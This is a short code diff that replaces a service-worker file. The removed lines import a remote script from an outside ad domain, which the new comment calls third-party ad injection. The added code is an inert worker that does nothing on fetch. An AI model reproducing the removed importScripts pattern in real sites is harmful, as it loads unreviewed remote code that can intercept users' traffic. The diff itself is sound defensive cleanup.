@@ -1,6 +1,14 @@
-self.options = {
-    "domain": "3nbf4.com",
-    "zoneId": 11836219
-}
-self.lary = ""
-importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
+// This app does not use a service worker.
+// Keep the file present but inert to avoid third-party ad injection.
+self.addEventListener('install', () => {
+  self.skipWaiting();
+});
+
+self.addEventListener('activate', (event) => {
+  event.waitUntil(self.clients.claim());
+});
+
+self.addEventListener('fetch', (event) => {
+  // Intentionally do nothing.
+  return;
+});
